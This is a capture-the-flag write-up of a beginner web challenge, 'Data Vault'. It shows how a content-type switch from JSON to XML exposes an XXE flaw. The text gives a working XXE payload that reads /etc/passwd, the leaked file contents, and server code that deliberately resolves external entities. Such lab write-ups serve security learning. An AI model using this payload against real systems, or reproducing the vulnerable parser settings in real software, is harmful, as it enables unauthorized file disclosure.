# Data Vault

**Description:**

DataVault is a secure JSON-based profile storage API.

Can you find a way to access sensitive server files?

**Category:** Web

**Difficulty:** easy

## Solution

Started by browsing to the site to find a site called Data Vault that you can enter your details (name, bio) to store your profile via an JSON API. It shows "DataVault provides a simple REST API for profile storage. We accept JSON payloads and return structured responses."
![alt text](image.png)

When viewing the page source the section for the api icons is intersting not just showing JSON but also XML. 
```HTML
<div class="api-icons">
    <div class="api-icon json-icon" title="JSON">{ }</div>
    <div class="api-icon xml-icon" title="XML">&lt;/&gt;</div>
    <div class="api-icon secure-icon" title="Secure">🔒</div>
    <div class="api-icon fast-icon" title="Fast">⚡</div>
</div>
```

I submited a profile by giving a name of username and a bio of userbio and looked at what was sent in the request and what the response was by using Burp Suite. 
Saw a request POST request with the data of `{"name":"username","bio":"userbio"}` and a response of:
```
{
    "received":{
        "bio":"userbio",
        "name":"username"
    },
    "source":"application/json",
    "status":"ok"
}
```

With the hint about XML found in the pages source code lead me this maybe an XML external entity (XXE) injection https://portswigger.net/web-security/xxe 

Set a test request using XML to see if the API would respond to an XML request and it did.

burp suite xml request and response: ![alt text](image-1.png)

Took one of the examples from the portswigger site to create a request containing: 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE profile [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<profile>
  <name>&xxe;</name>
  <bio>userbio</bio>
</profile>
```

That gave me a response confirming that XXE was possilbe on this site showing data from /etc/passwd.
```
{"received":{"bio":"userbio","name":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:6"},"source":"application/xml","status":"ok"}
```

After some trial and error.... I found app/server.py that gave me part of the python the site was using. With a little more3 trial and error I noticed the returned data coming from using the name... text box? input?... seemed to have a charactor limit. When changing the to use bio I was able to get back the full app/server.py. 

request getting app.server.py screen shot: ![alt text](image-2.png)

The python after formatting it be easer to read, can see that name was limited to 200 charactors and bio at 20,000.
```python
from flask import Flask, request, jsonify, render_template
from lxml import etree
    
app = Flask(__name__)

@app.get("/\")
def index():
    return render_template("index.html")

@app.post("/api/profile")
def profile():
    ct = (request.content_type or "\").split(";")[0].strip().lower()
    result = {"status": "ok", "source": ct, "received": {}}

    if ct == "application/json":
        try:
            data = request.get_json(force=True, silent=False)
            result["received"] = {
                "name": str(data.get("name", "\"))[:200],
                "bio": str(data.get("bio", "\"))[:500],
            }
            return jsonify(result), 200
        except Exception:
            return jsonify({"status": "error", "message": "Invalid JSON"}), 400

    elif ct == "application/xml" or ct == "text/xml":
        try:
            parser = etree.XMLParser(resolve_entities=True, no_network=False)
            root = etree.fromstring(request.data, parser=parser)
            name_elem = root.find(".//name")
            bio_elem = root.find(".//bio")
            name_text = name_elem.text if name_elem is not None else "\"
            bio_text = bio_elem.text if bio_elem is not None else "\"
            result["received"] = {
                "name": (name_text or "\")[:200],
                "bio": (bio_text or "\")[:20000]
            }
            return jsonify(result), 200
        except Exception:
            return jsonify({"status": "error", "message": "Invalid XML"}), 400

    else:
        return jsonify({"status": "error", "message": "Unsupported content-type"}), 415
```

After stepping away for a little bit, when coming back reviwing my notes again I noticed I did /etc/passwd using name (that has the shortly limit). So Running that again found the flag of `flag{XX3_v!a_C0nt3nt_Typ3_Sw1tch}`
![alt text](image-3.png)